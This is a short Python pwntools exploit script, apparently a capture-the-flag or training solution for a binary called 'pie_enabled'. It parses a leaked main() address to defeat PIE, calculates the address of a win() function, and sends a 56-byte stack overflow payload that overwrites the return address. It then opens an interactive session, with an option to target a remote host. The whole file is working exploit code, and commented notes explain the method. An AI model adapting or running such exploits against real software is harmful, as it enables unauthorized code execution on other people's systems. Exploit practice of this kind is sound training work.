#!/usr/bin/python3
from pwn import *

### Beware of GDB messing with rdi value in the read call

elf = context.binary = ELF("../pie_enabled")

gs = '''
b main
b *main+116
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses
main_off = 0x11fc
win_off = 0x11c9

# Functions

io = start()



io.recvuntil(b"main(): 0x")
pie_leak = io.recvline().strip(b"\n")
pie_leak = int(pie_leak, 16)
pie_base = pie_leak - main_off
log.info("Main() leak: %s"%hex(pie_leak))
log.info("Pie base: %s"%hex(pie_base))

# Since the binary is compiled with symbols (not stripped) you can now do the following:
# elf.address = pie_base
# and then you can access addresses easier like this: elf.sym['win']. Since now it knows the
# base address it will automatically calculate the offset
# You can also do it manually like below:
win = win_off + pie_base
log.info("Win() addr: %s"%hex(win))

p = b"A"*56
p += p64(win)

io.recvuntil(b">>")
io.send(p)

io.interactive()
